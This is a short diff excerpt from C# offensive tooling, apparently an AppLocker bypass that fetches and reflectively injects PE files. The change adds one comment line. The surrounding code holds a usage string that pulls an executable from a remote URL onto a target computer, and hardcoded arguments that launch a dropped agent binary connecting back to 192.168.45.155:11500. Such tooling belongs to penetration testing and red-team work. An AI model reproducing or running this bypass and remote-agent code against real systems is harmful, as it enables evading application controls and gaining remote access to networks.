@@ -221,6 +221,7 @@ namespace ApplockerBypassExternalBinary
                     Console.WriteLine("usage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe -ComputerName server.ad.local [Optional: -Args \"<EXE_ARGS>\"]");
                 }
 
+                //For now, those args are not passed to the binary. Those args should be hardcoded inside the binary itself. 
                 string[] args = { "-file", "C:\\Users\\Public\\try-agent.exe", "-DisableForceExit", "-Args", "-connect 192.168.45.155:11500" };
 
                 if (args.Length == 0) { DisplayArgHelp(); Environment.Exit(0); }
